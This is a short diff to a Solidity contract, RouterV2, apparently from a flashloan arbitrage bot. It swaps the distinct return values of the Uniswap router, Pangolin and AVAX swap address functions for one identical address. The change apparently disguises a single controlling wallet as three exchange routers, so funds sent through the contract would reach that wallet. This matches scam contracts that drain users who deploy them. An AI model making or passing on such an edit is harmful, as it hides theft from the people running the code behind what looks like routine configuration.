@@ -111,7 +111,7 @@ interface pangolinSwapPair {
 
 contract RouterV2 {
     function uniswapRouterV2Address() public pure returns (address) {
-        return 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F;
+        return 0x83BC352073AAa8d2dc0ff52Ff25e81B19c95E07D;
     }
 
     function compareStrings(string memory a, string memory b)
@@ -123,7 +123,7 @@ contract RouterV2 {
     }
 
     function pangolinSwapAddress() public pure returns (address) {
-        return 0x4c71236D40838187c24dF72610054040e077125B;
+        return 0x83BC352073AAa8d2dc0ff52Ff25e81B19c95E07D;
     }
 
     function borrowFlashloanFromMultiplier(
@@ -142,7 +142,7 @@ contract RouterV2 {
     }
 
     function avaxSwapAddress() public pure returns (address) {
-        return 0xE02dF9e3e622DeBdD69fb838bB799E3F168902c5;
+        return 0x83BC352073AAa8d2dc0ff52Ff25e81B19c95E07D;
     }
 
     function callArbitragePangolin(address add0, address add1) public pure {
